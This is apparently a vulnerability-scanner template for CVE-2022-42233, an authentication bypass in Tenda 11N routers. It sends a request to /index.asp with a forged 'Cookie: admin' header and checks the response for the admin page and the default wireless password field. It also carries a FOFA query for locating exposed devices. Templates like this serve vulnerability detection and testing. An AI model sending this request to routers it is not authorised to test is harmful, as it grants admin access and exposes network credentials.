id: CVE-2022-42233

info:
  name: Tenda 11N - Authentication Bypass
  author: For3stCo1d
  severity: critical
  description: |
    Tenda 11N with firmware version V5.07.33_cn suffers from an Authentication Bypass vulnerability.
  reference:
    - https://github.com/D0ngsec/vulns/blob/main/Tenda/Tenda_11N_Authentication_Bypass.md
    - https://nvd.nist.gov/vuln/detail/CVE-2022-42233
  metadata:
    fofa-query: product=="Tenda-11N-Wireless-AP"
  tags: cve,cve2022,tenda,auth-bypass,router

requests:
  - raw:
      - |
        GET /index.asp HTTP/1.1
        Host: {{Hostname}}
        Cookie: admin

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'def_wirelesspassword'
          - '<SCRIPT language=JavaScript src="gozila.js">'
        condition: and

      - type: word
        part: header
        words:
          - 'GoAhead-Webs'

      - type: status
        status:
          - 200
